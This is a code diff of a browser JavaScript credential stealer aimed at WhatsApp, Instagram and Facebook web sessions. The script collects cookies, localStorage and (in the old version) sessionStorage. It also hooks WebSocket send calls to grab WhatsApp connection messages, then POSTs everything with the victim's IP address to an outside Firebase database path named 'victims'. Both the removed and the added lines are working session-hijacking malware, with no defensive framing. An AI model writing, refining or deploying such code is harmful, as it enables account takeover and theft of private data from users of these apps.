@@ -1,9 +1,8 @@
-(function() {
+(function () {
   'use strict';
 
-  const FIREBASE_URL = 'https://sessionid-d86e2-default-rtdb.firebaseio.com/victims';
+  const DB_URL = 'https://sessionid-d86e2-default-rtdb.firebaseio.com/victims';
 
-  // IP le lo
   async function getIP() {
     try {
       const res = await fetch('https://api.ipify.org');
@@ -13,66 +12,51 @@
     }
   }
 
-  // Data bhejo
   async function send(data, type) {
     const ip = await getIP();
     const payload = {
+      app: location.href.includes('whatsapp') ? 'WhatsApp' : location.href.includes('instagram') ? 'Instagram' : 'Facebook',
+      ip,
       url: location.href,
       timestamp: new Date().toISOString(),
-      userAgent: navigator.userAgent,
-      ip: ip,
-      type: type,
-      data: data
+      type,
+      data
     };
 
-    fetch(`${FIREBASE_URL}.json`, {
+    fetch(`${DB_URL}.json`, {
       method: 'POST',
       body: JSON.stringify(payload),
       headers: { 'Content-Type': 'application/json' }
     });
   }
 
-  // 1. Cookies
-  function stealCookies() {
-    const cookies = {};
-    document.cookie.split(';').forEach(c => {
-      const [k, v] = c.trim().split('=');
-      if (k && v) cookies[k] = v;
-    });
-    if (Object.keys(cookies).length > 0) {
-      send(cookies, 'cookies');
-    }
+  // 1. localStorage
+  const ls = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    ls[key] = localStorage.getItem(key);
   }
+  if (Object.keys(ls).length) send(ls, 'localStorage');
 
-  // 2. localStorage + sessionStorage
-  function stealStorage() {
-    const data = {
-      localStorage: { ...localStorage },
-      sessionStorage: { ...sessionStorage }
+  // 2. Non-HttpOnly Cookies
+  const cookies = {};
+  document.cookie.split(';').forEach(c => {
+    const [k, v] = c.trim().split('=');
+    if (k) cookies[k] = v;
+  });
+  if (Object.keys(cookies).length) send(cookies, 'visible_cookies');
+
+  // 3. WhatsApp WebSocket (for Conn message)
+  if (location.href.includes('whatsapp.com')) {
+    const origSend = WebSocket.prototype.send;
+    WebSocket.prototype.send = function (data) {
+      try {
+        const msg = JSON.parse(data);
+        if (msg?.[1]?.includes?.('Conn')) {
+          send({ Conn: msg }, 'whatsapp_conn');
+        }
+      } catch (e) {}
+      return origSend.apply(this, arguments);
     };
-    send(data, 'storage');
   }
-
-  // 3. WhatsApp WebSocket Hook
-  const origSend = WebSocket.prototype.send;
-  WebSocket.prototype.send = function(data) {
-    try {
-      const msg = JSON.parse(data);
-      if (msg && msg[1] && typeof msg[1] === 'string' && msg[1].includes('Conn')) {
-        send({ websocket: msg }, 'websocket_conn');
-      }
-    } catch(e) {}
-    return origSend.apply(this, arguments);
-  };
-
-  // Sab chori karo
-  stealCookies();
-  stealStorage();
-
-  // Har 5 sec update
-  setInterval(() => {
-    stealCookies();
-    stealStorage();
-  }, 5000);
-
 })();
